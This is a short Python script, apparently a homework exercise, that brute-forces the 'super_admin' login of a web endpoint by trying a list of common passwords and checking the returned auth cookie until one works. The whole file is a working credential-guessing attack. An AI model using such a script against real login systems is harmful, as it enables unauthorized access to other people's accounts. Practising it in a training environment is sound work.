import requests
from environment import default_url

possible_password = ['123456', '123456789', 'qwerty','password','111111',
                     'password', '1234567', '12345678', '12345', 'iloveyou', '111111', '123123', 'abc123', 'qwerty123',
                     '1q2w3e4r', 'admin', 'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome',
                     '888888', 'princess', 'dragon', 'password1', '123qwe']


for password in possible_password:
    get_auth_cookie = requests.post(f"{default_url}/get_secret_password_homework",
                                    data={'login': 'super_admin', 'password':password})
    auth_cookie = get_auth_cookie.cookies.get('auth_cookie')

    check_auth_cookie = requests.get(f"{default_url}/check_auth_cookie", cookies={'auth_cookie': auth_cookie})
    if check_auth_cookie.text != 'You are NOT authorized':
        print(f'pass: {password} fits!')
        print(f'pass: {password} was {possible_password.index(password)} in the list')
        break
    else:
        print(f'pass: {password} does not fit')
